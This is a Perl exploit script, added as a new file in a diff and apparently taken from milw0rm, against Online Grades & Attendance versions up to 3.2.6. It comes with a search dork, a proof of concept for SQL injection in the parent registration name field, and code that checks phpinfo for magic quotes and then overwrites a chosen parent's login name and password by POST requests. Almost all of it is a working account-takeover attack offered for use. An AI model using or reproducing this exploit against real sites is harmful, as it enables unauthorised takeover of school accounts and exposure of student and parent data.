@@ -1,0 +1,224 @@
+#!/usr/bin/perl
+#***********************************************************************************************
+#***********************************************************************************************
+#**	       										      **
+#**  											      **
+#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
+#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
+#**							                                      **
+#**    											      **
+#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+#**					  ¡PROUD TO BE SPANISH!	                              **
+#**											      **
+#***********************************************************************************************
+#***********************************************************************************************
+#
+#----------------------------------------------------------------------------------------------
+#|       (Post Form --> Parent Register (name)) Credentials Changer (SQLi) EXPLOIT	      |
+#|--------------------------------------------------------------------------------------------|
+#|                           |    Online Grades & Attendance v-3.2.6   |		      |
+#|  CMS INFORMATION:          -----------------------------------------	               	      |
+#|										              |
+#|-->WEB: http://www.onlinegrades.org/			          			      |
+#|-->DOWNLOAD: http://www.onlinegrades.org/		                  		      |
+#|-->DEMO: http://www.onlinegrades.org/demo_info					      |
+#|-->CATEGORY: CMS / Education								      |
+#|-->DESCRIPTION: Online Grades is based on the project, Basmati. It has all of the same      |
+#|		features plus many new features. OG is a web based grade...		      |
+#|-->RELEASED: 2009-02-05								      |
+#|											      |
+#|  CMS VULNERABILITY:									      |
+#|											      |
+#|-->TESTED ON: firefox 3						                      |
+#|-->DORK: "Powered by Online Grades"						              |
+#|-->CATEGORY: SQL INJECTION							              |
+#|-->AFFECT VERSION: <= 3.2.6						 		      |
+#|-->Discovered Bug date: 2009-05-21							      |
+#|-->Reported Bug date: 2009-05-21							      |
+#|-->Fixed bug date: Not fixed								      |
+#|-->Info patch: Not fixed							              |
+#|-->Author: YEnH4ckEr									      |
+#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
+#|-->WEB/BLOG: N/A									      |
+#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
+#----------------------------------------------------------------------------------------------
+#
+#------------
+#CONDITIONS:
+#------------
+#
+#gpc_magic_quotes=OFF
+#
+#-----------------
+#PRE-REQUIREMENTS
+#-----------------
+#
+#Option --> Self Registration --> Allowed (Default value)
+#
+#-------
+#NEED:
+#-------
+#
+#Valid parent id
+#
+#---------------------------------------
+#PROOF OF CONCEPT (SQL INJECTION):
+#---------------------------------------
+#
+#Register module (name) is vuln to sql injection.
+#
+#Full name --> y3nh4ck3r', id=1 ON DUPLICATE KEY UPDATE client_id='owned'#
+#
+#Other parameters --> something
+#
+#
+#Return: Change client_id to 'owned' for parent id=1
+#
+#
+##############################################################################
+##############################################################################
+##**************************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
+##**************************************************************************##
+##--------------------------------------------------------------------------##
+##**************************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
+##**************************************************************************##
+##############################################################################
+##############################################################################
+#
+#
+use LWP::UserAgent;
+use HTTP::Request;
+#Subroutines
+sub lw
+{
+	my $SO = $^O;
+	my $linux = "";
+	if (index(lc($SO),"win")!=-1){
+		$linux="0";
+	}else{
+		$linux="1";
+	}		
+	if($linux){
+		system("clear");
+	}
+	else{
+		system("cls");
+		system ("title Online Grades Attendance v-3.2.6 (Credentials changer) Exploit");
+		system ("color 02");
+	}
+}
+sub request {
+	my $userag = LWP::UserAgent->new;
+	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+	if($_[2] eq "post"){
+		$request = HTTP::Request -> new(POST => $_[0]);
+		$request->referer($_[0]);
+		$request->content_type('application/x-www-form-urlencoded');
+		$request->content($_[1]);
+	}else{
+		$request = HTTP::Request -> new(GET => $_[0]);
+	}
+	my $outcode= $userag->request($request)->as_string;
+	return $outcode;
+}
+sub error {
+print "\t------------------------------------------------------------\n";
+	print "\tWeb isn't vulnerable!\n\n";
+	print "\t--->Maybe:\n\n";
+	print "\t\t1.-Patched.\n";
+	print "\t\t2.-Bad path or host.\n";
+	print "\t\tEXPLOIT FAILED!\n";
+	print "\t------------------------------------------------------------\n";
+}
+sub errormagicquotes {
+print "\t------------------------------------------------------------\n";
+	print "\tWeb isn't vulnerable!\n\n";
+	print "\t\tRaison--> Magic quotes ON.\n";
+	print "\t\tEXPLOIT FAILED!\n";
+	print "\t------------------------------------------------------------\n";
+}
+sub helper {
+	print "\n\t[!!!] Online Grades & Attendance <= v-3.2.6 (Credentials changer) Exploit\n";
+	print "\t[!!!] USAGE MODE: [!!!]\n";
+	print "\t[!!!] perl $0 [HOST] [PATH] [Email Address] [Password] [Target_id]\n";
+	print "\t[!!!] [HOST]: Web.\n";
+	print "\t[!!!] [PATH]: Home Path.\n";
+	print "\t[!!!] [Email Address]: Set value\n";
+	print "\t[!!!] [Password]: Set value\n";
+	print "\t[!!!] [Target_id]: victim id\n";
+	print "\t[!!!] Example: perl $0 'www.onlinegrades.org' 'demo' 'y3nh4ck3r' 'y3nh4ck3r' '1' \n";
+}
+#Main
+&lw;
+print "\t#######################################################\n\n";
+print "\t#######################################################\n\n";
+print "\t##        Online Grades & Attendance <= v-3.2.6      ##\n\n";
+print "\t##           (Credentials changer) Exploit           ##\n\n"; 
+print "\t##         ++Conditions: magic_quotes=OFF            ##\n\n";
+print "\t##         ++Needed: Valid parent id                 ##\n\n";
+print "\t##               Author: Y3nh4ck3r                   ##\n\n";
+print "\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n";
+print "\t##            Proud to be Spanish!                   ##\n\n";
+print "\t#######################################################\n\n";
+print "\t#######################################################\n\n";
+#Init variables
+my $host=$ARGV[0];
+my $path=$ARGV[1];
+my $client_id=$ARGV[2];
+my $client_pw=$ARGV[3];
+$numArgs = $#ARGV + 1;
+if($numArgs<=3) 
+	{
+		&helper;
+		exit(1);	
+	}	
+	if(!$ARGV[4]){
+		$target_id=1;
+	}else{
+		$target_id=$ARGV[4];	
+	}
+
+#Build uri
+my $finalhost="http://".$host."/".$path."/parents/register.php?action=register";
+my $phpinfo="http://".$host."/".$path."/include/phpinfo.php";
+#sql injection	
+$injection="y3nh4ck3r', id=".$target_id." ON DUPLICATE KEY UPDATE client_id='".$values."'#";
+$post="name=".$injection."&email=y3nh4ck3r%40gmail.com&pass1=y3nh4ck3r&pass2=y3nh4ck3r";
+$output=&request($phpinfo,0,'get');
+if($output=~(/\<tr\>\<td class\=\"e\">magic\_quotes\_gpc\<\/td\>\<td class\=\"v\"\>On\<\/td\>\<td class\=\"v\"\>On\<\/td\>\<\/tr\>/)){
+	&errormagicquotes;
+	exit(1);
+}
+$injection_email="y3nh4ck3r', id=".$target_id." ON DUPLICATE KEY UPDATE client_id='".$client_id."'#";
+$post="name=".$injection_email."&email=y3nh4ck3r%40gmail.com&pass1=y3nh4ck3r&pass2=y3nh4ck3r";
+$output=&request($finalhost, $post, 'post');
+$injection_pw="y3nh4ck3r', id=".$target_id." ON DUPLICATE KEY UPDATE client_pw='".$client_pw."'#";
+$post="name=".$injection_pw."&email=y3nh4ck3r%40gmail.com&pass1=y3nh4ck3r&pass2=y3nh4ck3r";
+$output=&request($finalhost, $post, 'post');
+#processed
+if($output!~(/\<strong\>ERROR\<\/strong\>/))
+{  
+		print "\n\t-----------------------------------------------------------------\n";
+		print "\t--  EXPLOIT EXECUTED (Online Grades & Attendance <= v-3.2.6)   --\n";
+		print "\t--                  (Credentials changer) Exploit              --\n";
+		print "\t-----------------------------------------------------------------\n\n";
+		print "\t\tParent credentials changed!\n\n";
+		print "\t\tIf id doesn't exist, you add a new inconsistent user!\n\n";
+		print "\n\t<<<<<<----------------------FINISH!---------------->>>>>>>>\n\n";
+		print "\t<<<<<<--------------Thanks to: y3hn4ck3r------------>>>>>>>\n\n";
+		print "\t<<<<<<-----------------------EOF-------------------->>>>>>>\n\n";
+}else{
+	&error;
+}
+exit(1);
+#Ok...all job done
+
+# milw0rm.com [2009-06-01]
